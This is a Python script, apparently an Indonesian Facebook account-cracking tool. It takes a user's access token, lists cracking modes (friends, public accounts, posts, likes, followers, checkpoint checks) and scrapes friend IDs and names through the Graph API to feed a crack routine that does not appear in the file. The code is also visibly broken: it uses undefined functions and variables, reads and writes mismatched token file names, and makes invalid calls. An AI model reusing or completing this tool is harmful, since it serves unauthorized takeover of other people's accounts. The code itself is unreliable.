import requests,bs4,json,os,sys,random,datetime,time,re

import threading

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col


id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]



x = '\33[m' # DEFAULT

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

P = '\033[0;00m'

J = '\033[0;33m'

S = '\033[0;00m'

N = '\x1b[0m'

I ='\033[0;32m'

C ='\033[0;36m'

M ='\033[0;31m'

U ='\033[0;35m'

K ='\033[0;33m'

P='\033[00m'

h='\033[0;90m'

Q="\033[00m"

kk='\033[0;32m'

ff='\033[0;36m'

G='\033[0;36m'

p='\033[00m'

h='\033[0;90m'

Q="\033[00m"

I='\033[0;32m'

II='\033[0;36m'

m='\033[0;31m'

O ='\033[0;33m'

H='\033[0;33m'

b = '\033[0;36m'

war = "[•]"

B = random.choice([U,I,K,b,M])



dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}

dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def clear():
	os.system('clear')
def back():
	menu()
def banner():
	print('''%s
	_______           ______   _______  _                 ______  
       (  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
       | (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
       | (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
       |     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
       | (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
       | ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
       |/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
                                                               
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Rudal-XD
 [\x1b[1;96m+%s] Github   : -
 [\x1b[1;96m+%s] Facebook : Fanky
───────────────────────────────────────────────────────\n'''%(N,N,N,N))


balmond = O+"["+J+"•"+O+"]"


def login():
		banner()
		sky = '# MASUKAN TOKEN FACEBOOK'
		sky2 = mark(sky, style='green')
		sol().print(sky2, style='cyan')
		panda = input(x+'['+p+'•'+x+'] Token Fb : ')
		akun=open('.token.x','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			sue = '# nice Login berhasil'
			suu = mark(sue, style='green')
			sol().print(suu, style='cyan')
			time.sleep(2)
			menu()
		except KeyError:
			sue = '# Login Gagal, Cek token'
			suu = mark(sue, style='red')
			sol().print(suu, style='cyan')
			time.sleep(2)
			login()
		except requests.exception.ConnectionError:
			li = '# KONEKSI INTERNET 									BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			menu()
		
class menu:

	def __init__(self): #line1
		self.uid = []
	def menu(self):
		try:
			toke = open('token.x','r').read()
		except IOError:
			print(' [%s+%s] Kamu belum login'%(M,N));login().__login__()
		try:
			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
		except KeyError:
			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
		except requests.exceptions.ConnectionError:
			exit(' [%s!%s] cek koneksi'%(M,N))
		try:
			akss = open('token.x','r').read()
		except IOError:
			akss = '-'
		banner()
		IP = requests.get('https://api.ipify.org').text
		jalan(' %s[ %sselamat Datang %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(H,O,H,IP))
		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
		print(' %s[%s5%s] crack dari followers'%(N,O,N))
		print(' %s[%s6%s] cek opsi akun chekpoint'%(N,O,N))
		print(' %s[%s7%s] cek hasil crack ok,cp'%(N,O,N))
		print(' %s[%s8%s] seting User-Agent'%(N,O,N))
		print(' %s[%s9%s] crack email'%(N,O,N))
		print(' %s[%sG%s] Get data² facebook'%(N,O,N))
		print(' %s[%sK%s] Lapor bug script'%(N,O,N))
		print(' %s[%sA%s] Keluar, hapus token'%(N,O,N))
		self.pilih()
	def pilih(self):

		print(' %s'%(N))

		usna = input(' %s[%s+%s] choose : '%(N,O,N))

		if usna in ['']:

			print(' %s'%(N))

			print(' %s[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()

		elif usna in ['0','00']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Cek token kamu'%(N,M,N))

			try:

				lmt = input(' %s[%s+%s] Limit id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))

				z = json.loads(r.text)

				id = []

				for w in z['friends']['data']:

					id.append(z['id'] + '<=>' + w['name'])

			except KeyError:

				print(' %s[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['1','01']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Coba jalankan ulang !'%(N,M,N))

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,token))

				e = json.loads(r.text)

				id = []

				for u in e['friends']['data']:

					id.append(u['id'] + '<=>' + u['name'])

			except KeyError:

				print(' %s'%(N))

				jalan(' %s[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['2','02']:

				exit()

if __name__=='__main__':
	menu()
